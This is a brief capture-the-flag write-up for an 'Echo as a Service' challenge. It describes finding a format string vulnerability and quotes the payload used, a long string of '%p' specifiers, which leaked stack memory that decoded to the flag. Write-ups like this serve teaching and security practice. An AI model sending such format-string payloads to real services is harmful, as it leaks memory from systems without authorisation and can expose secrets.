# Echo as a Service

I never really even took the time to understand the vulnerability with this problem. It became clear from basic testing that there's a format string vulnerability. Sending some input like `AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p` printed a lot of characters that looked like ASCII printable characters, and when decoded revealed the flag.
